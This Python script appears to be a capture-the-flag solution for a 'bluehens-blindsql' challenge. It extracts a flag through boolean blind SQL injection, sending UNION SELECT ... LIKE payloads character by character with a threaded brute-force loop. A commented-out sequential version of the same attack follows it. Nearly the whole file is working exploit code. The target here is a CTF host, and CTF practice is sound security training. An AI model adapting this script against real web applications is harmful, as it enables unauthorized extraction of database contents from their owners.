import requests
import concurrent.futures

url = "https://bluehens-blindsql.chals.io/index.php?guess=1 UNION SELECT 1 FROM secret where flag like '" 

charset = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()-=+{}[]|;:'\",.<>?/`~"

flag = "UDCTF{"

def check_character(char):
    payload = f"{url}{flag}{char}%'"
    response = requests.get(payload)
    return "Good guess!" in response.text

with concurrent.futures.ThreadPoolExecutor() as executor:
    while True:
        futures = [executor.submit(check_character, char) for char in charset]
        concurrent.futures.wait(futures)
        
        found = False
        for char, future in zip(charset, futures):
            if future.result():
                flag += char
                found = True
                print(flag)
                break
        
        if not found or flag[-1] == "}":
            break

print("Flag:", flag)

# import requests

# url = "https://bluehens-blindsql.chals.io/index.php?guess=1 UNION SELECT 1 FROM secret where flag like '" 

# charset = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()-=+{}[]|;:'\",.<>?/`~"

# # The maximum length of the flag (adjust as needed)
# max_flag_length = 50

# flag = "UDCTF{"

# while True:
#     found = False
#     for char in charset:
#         payload = f"{url}{flag}{char}%'"
#         response = requests.get(payload)
        
#         # Check if the response contains "Good guess!" or "Nope"
#         if "Good guess!" in response.text:
#             flag += char
#             print(flag)
#             found = True
#             break
#     if flag[-1] == "}":
#         break

# print("Flag:", flag)